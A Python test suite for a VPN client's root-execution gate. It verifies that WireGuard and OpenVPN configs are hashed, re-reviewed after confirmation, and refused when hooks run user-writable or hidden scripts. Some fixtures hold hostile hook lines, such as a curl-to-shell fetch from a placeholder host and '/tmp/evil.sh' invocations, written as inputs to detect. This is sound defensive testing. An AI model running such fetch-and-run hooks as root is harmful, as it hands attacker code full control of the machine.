"""Audit tier-2, step S1: the confirmed review is what root runs.

The review the user confirmed travels to the worker; ``execute`` re-reviews and
aborts, with no administrator prompt, on any difference. Nothing here runs
wg-quick, openvpn, sudo or osascript; the runner is always a recorder.
"""

from __future__ import annotations

import hashlib
import os
import stat
import time
import types
from pathlib import Path

import pytest

from services import vpn_connection, vpn_execution

PRIVATE_KEY = "cHJpdmF0ZS1rZXktdGhhdC1tdXN0LW5ldmVyLWxlYWsxMjM0NTY3OA=="


class Recorder:
    def __init__(self, ok=True, output="ok"):
        self.ok, self.output, self.scripts = ok, output, []

    def __call__(self, script, prompt, timeout=30):
        self.scripts.append(script)
        return self.ok, self.output


class Probe(dict):
    def __init__(self, up=()):
        self.up = set(up)
        super().__init__(
            wireguard=lambda name: {"up": name in self.up, "device": "utun7" if name in self.up else None},
            openvpn_running=lambda: False,
            route_interface=lambda: None,
        )


@pytest.fixture(autouse=True)
def tools_installed(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: None if name == "wg-quick" else real_which(name, *a, **k))


def wg_conf(tmp_path, name="wgnl", interface_extra="", mode=0o600):
    path = tmp_path / f"{name}.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n{interface_extra}"
        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n", encoding="utf-8")
    os.chmod(path, mode)
    return path


def ovpn(tmp_path, body, name="home"):
    path = tmp_path / f"{name}.ovpn"
    path.write_text("client\nremote 203.0.113.7 1194\n" + body, encoding="utf-8")
    return path


def profile_for(path):
    return vpn_connection.profile_from_config(str(path))


def review(action, profile, probe=None):
    return vpn_execution.review_execution(action, profile, probe=probe or Probe(),
                                          killswitch_armed=lambda: False)


def run(action, profile, runner, confirmed, probe=None):
    return vpn_execution.execute(action, profile, confirmed=confirmed, run_as_root=runner,
                                 probe=probe or Probe(), killswitch_armed=lambda: False,
                                 sleep=lambda s: None)


# ── the fingerprint ─────────────────────────────────────────────────────────

def test_the_review_carries_the_sha256_of_the_exact_config_bytes(tmp_path):
    path = wg_conf(tmp_path)
    r = review("connect", profile_for(path))
    assert r.config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


def test_an_identical_config_gives_an_identical_fingerprint(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    assert review("connect", p).fingerprint() == review("connect", p).fingerprint()


def test_the_fingerprint_ignores_warnings_but_not_the_things_root_runs(tmp_path):
    import dataclasses
    r = review("connect", profile_for(wg_conf(tmp_path)))
    assert dataclasses.replace(r, warnings=("other",)).fingerprint() == r.fingerprint()
    for change in ({"action": "disconnect"}, {"protocol": "OpenVPN"}, {"target": "/x.conf"},
                   {"command": r.command + " --evil"}, {"interface": "wgx"},
                   {"root_hooks": ("PostUp: id",)}, {"config_sha256": "0" * 64}):
        assert dataclasses.replace(r, **change).fingerprint() != r.fingerprint(), change


def test_a_hook_added_after_confirmation_changes_the_fingerprint(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    before = review("connect", p)
    path.write_text(path.read_text().replace("Address", "PostUp = id\nAddress"))
    assert review("connect", p).fingerprint() != before.fingerprint()


def test_a_changed_comment_changes_the_hash_and_so_the_fingerprint(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    before = review("connect", p)
    path.write_text(path.read_text() + "# touched\n")
    assert review("connect", p).fingerprint() != before.fingerprint()


# ── execute() is gated on the confirmed review ──────────────────────────────

def test_execute_runs_when_the_confirmed_review_still_matches(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, review("connect", p))
    assert outcome.ran is True and len(runner.scripts) == 1


def test_execute_without_a_confirmed_review_fails_closed(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, None)
    assert outcome.ran is False and runner.scripts == []
    assert "no administrator access was requested" in outcome.sections()[0][1]
    assert outcome.status_line.startswith("Refused")


def test_execute_aborts_with_no_prompt_when_the_config_changed_after_confirmation(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    confirmed = review("connect", p)
    path.write_text(path.read_text().replace("Address", "PostUp = /usr/bin/true\nAddress"))
    runner = Recorder()
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is False and runner.scripts == []
    assert "changed since you confirmed" in outcome.error
    assert "Review again" in outcome.status_line


def test_execute_aborts_when_the_target_changed(tmp_path):
    first, second = wg_conf(tmp_path, "wgone"), wg_conf(tmp_path, "wgtwo")
    confirmed = review("connect", profile_for(first))
    runner = Recorder()
    outcome = run("connect", profile_for(second), runner, confirmed)
    assert outcome.ran is False and runner.scripts == []


def test_execute_aborts_when_the_confirmed_action_differs(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, review("disconnect", p, Probe(up={"wgnl"})))
    assert outcome.ran is False and runner.scripts == []


def test_a_blocked_review_still_reports_its_own_blockers(tmp_path):
    runner = Recorder()
    outcome = run("connect", {"name": "Ex", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
                              "interface": "wgjp", "placeholder": True}, runner, None)
    assert outcome.ran is False and "template" in outcome.error.lower()


# ── hooks: full text, disconnect scan ───────────────────────────────────────

def test_disconnect_review_scans_predown_and_postdown(tmp_path):
    """Inverse of the old test_disconnect_review_does_not_rescan_hooks."""
    path = wg_conf(tmp_path, "wgh", interface_extra="PostUp = /opt/hook.sh\n"
                   "PreDown = curl -s http://203.0.113.9/d | sh\nPostDown = id\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgh"}))
    assert r.root_hooks == ("PostUp: /opt/hook.sh",
                            "PreDown: curl -s http://203.0.113.9/d | sh",
                            "PostDown: id")
    assert r.config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


def test_a_long_hook_is_kept_whole_in_the_model_and_the_detail(tmp_path):
    command = "curl -s http://203.0.113.9/" + "a" * 500 + " | sh"
    path = wg_conf(tmp_path, interface_extra=f"PostUp = {command}\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == (f"PostUp: {command}",)
    assert command not in r.confirmation_text()          # the dialog body is shortened...
    assert "more characters" in r.confirmation_text()    # ...and says so
    assert command in r.confirmation_detail()            # ...but the detail has all of it
    assert any(command in body for _, body, _ in r.sections())


def test_a_short_hook_is_shown_in_full_in_the_confirmation(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = echo hi\n")
    r = review("connect", profile_for(path))
    assert "echo hi" in r.confirmation_text()
    assert "more characters" not in r.confirmation_text()


def test_a_hook_line_over_4000_characters_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = echo " + "x" * 4000 + "\n")
    r = review("connect", profile_for(path))
    assert not r.allowed and any("4000" in b for b in r.blockers)


# ── user-writable hook executables (D1) ─────────────────────────────────────

def _fake_stat(table):
    def stat_(path, *a, **k):
        entry = table.get(str(path))
        if entry is None:
            raise FileNotFoundError(path)
        uid, mode = entry
        return types.SimpleNamespace(st_uid=uid, st_mode=mode)
    return stat_


ROOT_DIR = stat.S_IFDIR | 0o755
ROOT_FILE = stat.S_IFREG | 0o755


def test_a_hook_script_owned_by_the_user_is_a_blocker(tmp_path):
    script = tmp_path / "hook.sh"
    script.write_text("#!/bin/sh\n")
    path = wg_conf(tmp_path, interface_extra=f"PostUp = {script} up\n")
    r = review("connect", profile_for(path))
    assert not r.allowed
    assert any(str(script) in b and "administrator" in b for b in r.blockers)


def test_a_group_writable_hook_script_is_a_blocker(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, stat.S_IFREG | 0o775),
        "/usr/local/sbin": (0, ROOT_DIR), "/usr/local": (0, ROOT_DIR),
        "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh\n")
    assert not review("connect", profile_for(path)).allowed


def test_a_writable_parent_directory_is_a_blocker(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/opt/tools/hook.sh": (0, ROOT_FILE),
        "/opt/tools": (501, stat.S_IFDIR | 0o755), "/opt": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /opt/tools/hook.sh\n")
    assert not review("connect", profile_for(path)).allowed


def test_a_root_owned_hook_script_is_allowed(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, ROOT_FILE),
        "/usr/local/sbin": (0, ROOT_DIR), "/usr/local": (0, ROOT_DIR),
        "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh up\n")
    r = review("connect", profile_for(path))
    assert r.allowed and r.root_hooks == ("PostUp: /usr/local/sbin/hook.sh up",)


def test_a_bare_hook_command_outside_the_system_folders_is_refused(tmp_path, monkeypatch):
    """Second review of #32 (P1-2): a bare name wg-quick would find only in its own
    (user-writable) folder, or not yet at all, could be created after the review."""
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: None)
    path = wg_conf(tmp_path, interface_extra="PostUp = iptables -A FORWARD -j ACCEPT\n")
    r = review("connect", profile_for(path))
    assert _blocked(r, "'iptables', which is not a program in /usr/bin, /bin, /usr/sbin, /sbin")


def test_an_openvpn_up_script_in_a_user_directory_is_a_blocker(tmp_path):
    script = tmp_path / "up.sh"
    script.write_text("#!/bin/sh\n")
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {script}\n")))
    assert not r.allowed and any(str(script) in b for b in r.blockers)


# ── OpenVPN blockers and warnings (D3, D4) ──────────────────────────────────

@pytest.mark.parametrize("line", [
    "config other.ovpn", "management 127.0.0.1 7505", "management-client", "log /tmp/x",
    "log-append /tmp/x", "writepid /tmp/pid", "status /tmp/s", "tmp-dir /tmp", "cd /tmp",
    "chroot /tmp", "setenv FOO bar", "--config other.ovpn", "CONFIG other.ovpn",
])
def test_openvpn_directives_that_hide_or_redirect_are_blockers(tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert not r.allowed
    assert any(line.split()[0].lstrip("-").lower() in b.lower() for b in r.blockers)


def test_setenv_safe_is_not_setenv(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "setenv-safe FOO bar\n")))
    assert r.allowed


def test_unknown_openvpn_directives_only_warn_in_one_line(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "frobnicate 1\nwidget on\ncipher AES-256-GCM\n")))
    assert r.allowed
    unknown = [w for w in r.warnings if "not on the reviewed list" in w]
    assert len(unknown) == 1 and "frobnicate" in unknown[0] and "widget" in unknown[0]
    assert "cipher" not in unknown[0]


def test_a_plain_openvpn_profile_has_no_unknown_warning(tmp_path):
    body = ("dev tun\nproto udp\nnobind\npersist-key\nremote-cert-tls server\n"
            "<ca>\nMIIBogus\nconfig inside block is data\n</ca>\n<key>\nabc\n</key>\n")
    r = review("connect", profile_for(ovpn(tmp_path, body)))
    assert r.allowed and not any("reviewed list" in w for w in r.warnings)


def test_openvpn_connect_review_hashes_the_config(tmp_path):
    path = ovpn(tmp_path, "dev tun\n")
    assert review("connect", profile_for(path)).config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


# ── reading the config once ─────────────────────────────────────────────────

def test_an_oversized_config_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path)
    path.write_text(path.read_text() + "# " + "x" * (256 * 1024) + "\n")
    r = review("connect", profile_for(path))
    assert not r.allowed and any("256 KiB" in b for b in r.blockers)


def test_a_symlinked_config_is_a_warning(tmp_path):
    real = wg_conf(tmp_path, "wgreal")
    link = tmp_path / "wglink.conf"
    link.symlink_to(real)
    r = review("connect", profile_for(link))
    assert any("symbolic link" in w for w in r.warnings)


# ── the worker and the panel hand the confirmed review through ──────────────

def test_the_worker_passes_the_confirmed_review_to_execute(monkeypatch):
    from ui import workers
    seen = {}

    def fake_execute(action, profile, **kwargs):
        seen.update(action=action, kwargs=kwargs)
        return types.SimpleNamespace(as_result=lambda: {"success": True})

    monkeypatch.setattr(vpn_execution, "execute", fake_execute)
    sentinel = object()
    worker = workers.VpnConnectionWorker("connect", {"name": "x"}, sentinel)
    got = []
    worker.finished_signal.connect(got.append)
    worker.run()
    assert seen["kwargs"]["confirmed"] is sentinel and got == [{"success": True}]


def test_the_worker_defaults_to_no_confirmed_review(monkeypatch):
    from ui import workers
    assert workers.VpnConnectionWorker("connect", {})._confirmed is None


# ═════════════════════════════════════════════════════════════════════════════
# Round 2: independent review findings
# ═════════════════════════════════════════════════════════════════════════════

def _blocked(r, needle):
    return (not r.allowed) and any(needle in b for b in r.blockers)


# ── the OpenVPN scanner reads lines the way OpenVPN does ────────────────────

@pytest.mark.parametrize("line", [
    '"up" /x/y.sh', "u\\p /x/y.sh", "'plugin' /x/lib.so", '"config" other.ovpn',
    "lo\\g /tmp/x", '"script-security" 2', "--\"up\" /x", "'up'x /x",
])
def test_quoted_or_escaped_directive_names_are_blockers(tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert _blocked(r, "quote or backslash")


def test_an_unbalanced_quote_in_a_value_is_a_blocker(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, 'remote-cert-tls "server\n')))
    assert _blocked(r, "unbalanced")


def test_a_close_tag_with_trailing_text_is_an_ambiguous_block(tmp_path):
    body = "<ca>\nMIIBogus\n</ca>x\nup /tmp/evil.sh\n</ca>\n"
    r = review("connect", profile_for(ovpn(tmp_path, body)))
    assert _blocked(r, "ambiguous inline block")


def test_an_unterminated_inline_block_is_a_blocker(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "<ca>\nMIIBogus\nup /tmp/evil.sh\n")))
    assert _blocked(r, "ambiguous inline block")


def test_an_indented_close_tag_is_ambiguous(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "<ca>\nabc\n  </ca>\nup /x\n</ca>\n")))
    assert _blocked(r, "ambiguous inline block")


def test_a_properly_closed_block_with_crlf_is_fine(tmp_path):
    path = tmp_path / "crlf.ovpn"
    path.write_bytes(b"client\r\nremote 203.0.113.7 1194\r\n<ca>\r\nabc\r\n</ca>\r\nup /nonexistent-dir/x.sh\r\n")
    r = review("connect", profile_for(path))
    assert r.allowed
    assert r.root_hooks == ("up: /nonexistent-dir/x.sh",)        # no stray \r in the value


def test_crlf_does_not_hide_a_blocker(tmp_path):
    path = tmp_path / "crlf2.ovpn"
    path.write_bytes(b"client\r\nremote 203.0.113.7 1194\r\nconfig other.ovpn\r\n")
    assert _blocked(review("connect", profile_for(path)), "config")


def test_unicode_line_separators_do_not_split_lines(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "dev tun up /tmp/x\n")))
    assert r.root_hooks == ()          # OpenVPN sees one line; so does the scanner


def test_a_comment_starting_a_token_ends_the_line(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "verb 3 # config other\n")))
    assert r.allowed


# ── every path word of a hook command ───────────────────────────────────────

def _user_script(tmp_path):
    script = tmp_path / "evil.sh"
    script.write_text("#!/bin/sh\n")
    return script


@pytest.mark.parametrize("template", [
    "/bin/sh {s}", "sh {s}", "bash -c {s}", "/usr/bin/env FOO=1 {s}", "env {s}",
    "echo ok && {s}", "true; {s} up", "python3 {s}", "/usr/bin/perl {s}", "osascript {s}",
    "nohup {s}", "FOO=1 {s}", "'{s}'",
])
def test_a_user_writable_program_anywhere_in_a_wireguard_hook_is_a_blocker(tmp_path, template):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, interface_extra="PostUp = " + template.format(s=script) + "\n")
    assert _blocked(review("connect", profile_for(path)), str(script))


def test_a_tilde_path_in_an_interpreter_hook_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = sh ~/hook.sh\n")
    assert _blocked(review("connect", profile_for(path)), "~/hook.sh")


def test_a_user_writable_data_argument_of_a_root_program_is_only_a_warning(monkeypatch, tmp_path):
    data = tmp_path / "list.txt"
    data.write_text("x")
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/bin/true": (0, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
        "/": (0, ROOT_DIR), str(data): (501, stat.S_IFREG | 0o644),
        str(tmp_path): (501, stat.S_IFDIR | 0o755)}))
    path = wg_conf(tmp_path, interface_extra=f"PostUp = /usr/bin/true {data}\n")
    r = review("connect", profile_for(path))
    assert r.allowed and any(str(data) in w for w in r.warnings)


def test_a_user_writable_program_after_an_interpreter_in_openvpn_is_a_blocker(tmp_path):
    script = _user_script(tmp_path)
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup /bin/sh {script}\n")))
    assert _blocked(r, str(script))


# ── interface-only WireGuard profiles are hashed and scanned too ────────────

IFACE_ONLY = {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7", "interface": "wgx"}


def test_an_interface_only_profile_resolves_hashes_and_scans_its_conf(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx", interface_extra="PostUp = echo hi\n")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", ("/nonexistent-a", str(tmp_path)))
    r = review("connect", IFACE_ONLY)
    assert r.config_sha256 == hashlib.sha256(conf.read_bytes()).hexdigest()
    assert r.root_hooks == ("PostUp: echo hi",)


def test_an_interface_only_conf_with_a_user_script_hook_is_blocked(tmp_path, monkeypatch):
    script = _user_script(tmp_path)
    wg_conf(tmp_path, "wgx", interface_extra=f"PostUp = {script}\n")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    assert _blocked(review("connect", IFACE_ONLY), str(script))


def test_an_interface_only_profile_without_a_conf_says_import_it(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    assert _blocked(review("connect", IFACE_ONLY), "import the .conf")


def test_an_unreadable_interface_only_conf_blocks_a_connect(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx")
    os.chmod(conf, 0)
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    try:
        if os.access(conf, os.R_OK):
            pytest.skip("running as a user that can read mode 000 files")
        assert not review("connect", IFACE_ONLY).allowed
    finally:
        os.chmod(conf, 0o600)


@pytest.mark.parametrize("line", ["SaveConfig = true", "saveconfig=TRUE", "SAVECONFIG = True",
                                  "SaveConfig = true # keep my peers", "SaveConfig=true#x", "SaveConfig = true\t # x"])
def test_saveconfig_true_is_a_blocker(tmp_path, line):
    path = wg_conf(tmp_path, interface_extra=line + "\n")
    assert _blocked(review("connect", profile_for(path)), "SaveConfig")


def test_saveconfig_false_with_a_comment_is_fine(tmp_path):
    path = wg_conf(tmp_path, interface_extra="SaveConfig = false # true would rewrite it\n")
    assert review("connect", profile_for(path)).allowed


def test_saveconfig_false_is_fine(tmp_path):
    assert review("connect", profile_for(wg_conf(tmp_path, interface_extra="SaveConfig = false\n"))).allowed


# ── Disconnect never strands the user ───────────────────────────────────────

def test_a_user_writable_postdown_on_disconnect_is_a_risk_not_a_blocker(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgd"}))
    assert r.allowed and r.blockers == ()
    assert any(str(script) in item for item in r.risks)
    assert r.needs_second_confirmation is True


def test_the_same_hook_still_blocks_a_connect(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    assert not review("connect", profile_for(path)).allowed


def test_an_unreadable_config_on_disconnect_is_a_risk(tmp_path):
    path = wg_conf(tmp_path, "wgu")
    os.chmod(path, 0)
    try:
        if os.access(path, os.R_OK):
            pytest.skip("running as a user that can read mode 000 files")
        r = review("disconnect", profile_for(path), Probe(up={"wgu"}))
        assert r.allowed and r.risks
    finally:
        os.chmod(path, 0o600)


def test_an_oversized_config_on_disconnect_is_a_risk(tmp_path):
    path = wg_conf(tmp_path, "wgo")
    path.write_text(path.read_text() + "# " + "x" * (256 * 1024) + "\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgo"}))
    assert r.allowed and r.risks


def test_risks_are_part_of_the_fingerprint(tmp_path):
    import dataclasses
    p = profile_for(wg_conf(tmp_path, "wgd"))
    r = review("connect", p)
    assert dataclasses.replace(r, risks=("x",)).fingerprint() != r.fingerprint()


def test_disconnect_with_the_kill_switch_armed_runs_when_the_confirmed_review_matches(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    p = profile_for(path)
    probe = Probe(up={"wgd"})
    armed = vpn_execution.review_execution("disconnect", p, probe=probe, killswitch_armed=lambda: True)
    assert armed.allowed and armed.risks
    runner = Recorder()
    outcome = vpn_execution.execute("disconnect", p, confirmed=armed, run_as_root=runner,
                                    probe=probe, killswitch_armed=lambda: True, sleep=lambda s: None)
    assert outcome.ran is True and len(runner.scripts) == 1


def test_disconnect_still_fails_closed_on_a_fingerprint_mismatch(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    p = profile_for(path)
    probe = Probe(up={"wgd"})
    confirmed = review("disconnect", p, probe)
    path.write_text(path.read_text() + "PostDown = id\n")
    runner = Recorder()
    outcome = run("disconnect", p, runner, confirmed, probe)
    assert outcome.ran is False and runner.scripts == []


# ── honest hash wording and the dead unguarded wg-quick path ────────────────

def test_the_hash_line_says_when_it_was_checked(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = echo hi\n")))
    wording = "verified when the password prompt opened, not when it ran"
    assert wording in r.confirmation_detail()
    assert any(wording in body for _, body, _ in r.sections())


def test_the_module_and_execute_docstrings_do_not_overclaim():
    for doc in (vpn_execution.__doc__, vpn_execution.execute.__doc__):
        assert "not when root reads" in doc


def test_the_unguarded_wireguard_manager_wg_quick_helpers_refuse():
    from agents.vpn_agent.services import wireguard_manager
    with pytest.raises(RuntimeError, match="vpn_execution"):
        wireguard_manager.connect("wg0")
    with pytest.raises(RuntimeError, match="vpn_execution"):
        wireguard_manager.disconnect("wg0")


def test_the_tilde_rule_refuses_a_home_program_whatever_the_filesystem_says(monkeypatch):
    # Even if every path looked root-owned and read-only, ~ is a user's home.
    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
        st_uid=0, st_mode=stat.S_IFREG | 0o755))
    from pathlib import Path
    reason = vpn_execution._unsafe_executable_reason(Path("~/hook.sh"))
    assert reason and "home" in reason


def test_the_confirmation_dialog_lists_the_risks_of_a_disconnect(tmp_path):
    path = wg_conf(tmp_path, "wgo")
    path.write_text(path.read_text() + "# " + "x" * (256 * 1024) + "\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgo"}))
    assert r.risks
    body = r.confirmation_text()
    assert "Not reviewable" in body
    for item in r.risks:
        assert f"• {item}" in body
    assert any("Risks" in title and r.risks[0] in text for title, text, _ in r.sections())


# ── Codex review of PR #3: the reviewed file is the file root runs ─────────

def test_an_interface_only_connect_runs_the_reviewed_file_not_a_bare_name(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    r = review("connect", IFACE_ONLY)
    assert r.target == str(conf) and str(conf) in r.command
    runner = Recorder()
    outcome = vpn_execution.execute("connect", IFACE_ONLY, confirmed=r, run_as_root=runner,
                                    probe=Probe(), killswitch_armed=lambda: False,
                                    sleep=lambda s: None)
    assert outcome.ran and len(runner.scripts) == 1
    assert str(conf) in runner.scripts[0], "wg-quick must be given the hashed file"
    assert "wgx'" not in runner.scripts[0].replace(str(conf), "")


def test_an_interface_only_disconnect_also_names_the_reviewed_file(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    r = review("disconnect", IFACE_ONLY, Probe(up={"wgx"}))
    runner = Recorder()
    vpn_execution.execute("disconnect", IFACE_ONLY, confirmed=r, run_as_root=runner,
                          probe=Probe(up={"wgx"}), killswitch_armed=lambda: False,
                          sleep=lambda s: None)
    assert runner.scripts and str(conf) in runner.scripts[0]


def test_a_bare_hook_command_in_a_user_writable_path_directory_is_a_blocker(tmp_path, monkeypatch):
    helper = tmp_path / "helper"
    helper.write_text("#!/bin/sh\n")
    helper.chmod(0o755)
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: str(tmp_path / "wg-quick") if name == "wg-quick" else None)
    path = wg_conf(tmp_path, interface_extra="PostUp = helper --up\n")
    r = review("connect", profile_for(path))
    assert _blocked(r, "'helper', which is not a program in")
    assert any("write plain commands with full paths" in b for b in r.blockers)


def test_a_bare_hook_command_that_resolves_to_a_root_owned_program_is_accepted(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/id")
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/bin/id": (0, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
        "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = id -u\n")
    assert review("connect", profile_for(path)).allowed


def test_a_bare_hook_command_that_resolves_to_a_user_writable_program_is_refused(
        tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/id")
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/bin/id": (501, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
        "/": (0, ROOT_DIR)}))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = id\n")))
    assert _blocked(r, "resolves to /usr/bin/id")


def test_a_bare_hook_command_that_is_not_installed_is_refused(tmp_path, monkeypatch):
    """P1-2: wg-quick's PATH ends in its own Homebrew folder, so a user can create
    the program after the review."""
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: None)
    path = wg_conf(tmp_path, interface_extra="PostUp = nosuchcmd-zz9\n")
    assert _blocked(review("connect", profile_for(path)), "'nosuchcmd-zz9'")


def test_a_link_into_a_user_writable_folder_is_unsafe(tmp_path, monkeypatch):
    """A root-owned program reached through a link is judged by where the link
    leads: its real folder is writable, so a normal user could replace it."""
    safe, loose = tmp_path / "safe", tmp_path / "loose"
    safe.mkdir()
    loose.mkdir()
    target = loose / "tool"
    target.write_text("#!/bin/sh\n")
    link = safe / "tool"
    link.symlink_to(target)

    def stat_(path, *a, **k):
        mode = (stat.S_IFDIR | 0o777) if str(path) == str(loose) else ROOT_DIR
        return types.SimpleNamespace(st_uid=0, st_mode=mode)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    reason = vpn_execution._unsafe_executable_reason(link)
    assert reason is not None and str(loose) in reason
    assert vpn_execution._unsafe_executable_reason(safe / "missing") is None


def test_a_link_chain_through_a_user_writable_folder_is_unsafe(tmp_path, monkeypatch):
    """safe/tool -> loose/hop -> safe2/tool: the middle link sits in a folder a user
    can write, so it could be redirected after review."""
    safe, loose, safe2 = tmp_path / "safe", tmp_path / "loose", tmp_path / "safe2"
    for d in (safe, loose, safe2):
        d.mkdir()
    (safe2 / "tool").write_text("#!/bin/sh\n")
    (loose / "hop").symlink_to(safe2 / "tool")
    (safe / "tool").symlink_to(loose / "hop")

    def stat_(path, *a, **k):
        mode = (stat.S_IFDIR | 0o777) if str(path) == str(loose) else ROOT_DIR
        return types.SimpleNamespace(st_uid=0, st_mode=mode)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    reason = vpn_execution._unsafe_executable_reason(safe / "tool")
    assert reason is not None and str(loose) in reason


# ── review of #30: lines wg-quick reads differently, link walks, NUL bytes ──

@pytest.mark.parametrize("line, runs", [
    ("PostUp # = /tmp/evil.sh arg", "/tmp/evil.sh arg"),     # key cut at "#", value after "="
    ("PostUp#=/tmp/evil.sh", "/tmp/evil.sh"),
    ("postdown # note = /tmp/evil.sh", "/tmp/evil.sh"),
    ("PreUp", "PreUp"),                                       # no "=": the line itself runs
])
def test_a_hook_wg_quick_reads_past_a_comment_is_shown_and_refused(tmp_path, line, runs):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=line + "\n")))
    assert any(runs in hook for hook in r.root_hooks)
    assert _blocked(r, "WireGuard config:") and any("administrator" in b for b in r.blockers)


def test_a_hidden_hook_on_disconnect_is_a_risk_not_a_blocker(tmp_path):
    path = wg_conf(tmp_path, "wgh", interface_extra="PostDown # = /tmp/evil.sh\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgh"}))
    assert r.allowed and any("/tmp/evil.sh" in item for item in r.risks)


def test_a_comment_after_a_hook_value_is_not_a_hidden_hook(tmp_path):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = echo hi # note\n")))
    assert not any("WireGuard config:" in b for b in r.blockers)
